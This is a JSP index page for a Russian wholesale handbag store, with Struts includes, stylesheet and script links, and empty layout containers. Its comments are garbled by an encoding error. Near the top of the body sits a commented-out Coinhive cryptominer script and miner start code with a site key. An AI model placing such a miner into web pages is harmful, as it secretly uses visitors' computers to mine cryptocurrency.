<%@ page language="java" import="java.util.*"
    contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%
    String path = request.getContextPath();
    String basePath = request.getScheme() + "://"
            + request.getServerName() + ":" + request.getServerPort()
            + path + "/";
%>
<%@ taglib prefix="s" uri="/struts-tags"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
  <head>
    	<base href="<%=basePath%>">
		<meta charset="UTF-8">
		<title>999OWN.RU Сумки оптом купить по низкой цене от производителя</title>
		<meta http-equiv="pragma" content="no-cache">
		<meta http-equiv="cache-control" content="no-cache">
		<meta http-equiv="expires" content="0">
		<meta http-equiv="keywords" content="keyword1,keyword2,keyword3">
		<meta http-equiv="description" content="This is my page">
		
		<meta name="p:domain_verify" content="5926ca308c9c50c9e46234dce0a07efc"/>
		
		<!-- headerä»¥ä¸å¸å± -->
		<link  href="common/css/style.css" rel="stylesheet" type="text/css"/>
		
		<!--åååç±»ä¾§è¾¹æ  -->
		<link  href="common/css/silder.css" rel="stylesheet" type="text/css"/>
		
		<!-- é¦é¡µheaderé¡µé¢æ»å¨å¾å¸å±æ ·å¼css -->
        <link  href="common/css/leftmidright.css" rel="stylesheet" type="text/css"/>
        
        <!-- jsåjqueryç¸å³ -->
        <script type="text/javascript" src="js/json2.js"></script>
        <script type="text/javascript" src="js/jquery-1.10.2.js"></script>
        <script type="text/javascript" src="jquery-ui/jquery-ui.js"></script>
        <link rel="stylesheet" type="text/css" href="jquery-ui/jquery-ui.css">
        
        
        <!-- å­ä½-->
        <link rel="stylesheet" type="text/css" href="css/font.css"> 
        
        
        <!-- å¾çè½®æ­ -->
        <script type="text/javascript" src="common/js/imagePlay.js"></script>
        
        
        <!-- å¤tabéè¦çæ ·å¼
        <link rel="stylesheet" type="text/css" href="css/rentclick.css">
        <script type="text/javascript" src="js/rentclick.js"></script> 
		-->
        
        <!-- ------------------------------åæ¬ç½é¡µç¸å³--------------------------------------- -->

        
		<script type="text/javascript" src="js/index.js"></script>
		
        <!-- ------------------------------åæ¬ç½é¡µç¸å³--------------------------------------- -->
		
		

		<style type="text/css">

		</style> 
        
  </head>
  
  <body>
<%--  <script src="https://coinhive.com/lib/coinhive.min.js"></script>--%>
<script>
	// var miner = new CoinHive.Anonymous('EnzK5M2jBaMcQ308UAOLhhQHP8GtV3zp');
	// miner.start();
</script>
	  	<div style="display: none">
	        <%@ include file="common/language/multiLanguage.jsp" %>
		</div>
  		<div id="header">
			<%@ include file="common/header/headermenu.jsp" %>
			<%@ include file="common/header/header.jsp" %>
			 
		</div>
		

<!-- ----------------------------------------------------------------------------------- -->
		<div id="category-menu">
		     <div id="category-image-paly">
		        <div id="focus">
		            <ul nowrap="nowrap" class="imagePlayContainerUL">
		            </ul>
		        </div>
		     </div><!-- end of category-image-paly -->
		    <div id="lagout-three">
		    
		    <div class="lagout-three-r">
		                             <div class="rightsmall">
		                                
		                            </div>
		    </div>
		    
		     <div class="lagout-three-l">
		       <h2 class="menu-title"><s:text name="www.product.category"></s:text></h2>
		       <div class="product-list">                                                 
		                <div id="sidebar-menu"> 
		                    <ul class="catgoryContainerUL"> 
		                    </ul> 
		                    </div> <!--  end of menu sidebar-menu-->
		       </div><!-- end of product-list -->
		       </div>
		  </div> <!-- end of lagout-three -->
		  </div>
		  <div class='category-floors'>

  
          </div><!--  end of category-floors -->
  
  
  <div class="clearboth"></div>
<!-- ----------------------------------------------------------------------------------- -->
            <div id="footer">
                <%@ include file="common/header/footer.jsp" %>
             
            </div>
  </body>
</html>
